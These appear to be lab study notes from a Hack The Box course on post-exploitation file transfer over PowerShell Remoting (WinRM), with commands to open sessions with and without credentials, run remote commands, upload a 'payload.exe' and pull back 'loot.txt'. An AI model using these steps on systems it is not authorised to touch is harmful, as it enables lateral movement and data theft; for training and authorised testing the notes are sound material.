# Without Creds
#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.
#### Create a PowerShell Remoting Session to DATABASE01

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
# With creds
#### Check if WinRM is Open on the Target

```powershell
Test-NetConnection -ComputerName TARGET01 -Port 5985
```
#### Create a Session with Credentials

```PowerShell
$User = "htb\lowleveluser"
$Pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
```
#### Create a Remote PowerShell Session

```PowerShell
$Session = New-PSSession -ComputerName TARGET01 -Credential $Cred
```
#### Run Commands Remotely

```PowerShell
Invoke-Command -Session $Session -ScriptBlock { whoami }
```
#### Upload file **to remote host**

```PowerShell
Copy-Item "C:\local\payload.exe" -Destination "C:\Users\Public\" -ToSession $Session
```
#### Download file **from remote host**

```PowerShell
Copy-Item -Path "C:\Users\Public\loot.txt" -Destination "C:\loot\" -FromSession $Session
```
# Tags
> #Post-Exploitation #Windows-Post-Exploitation #File-Transfers #PowerShell-Remoting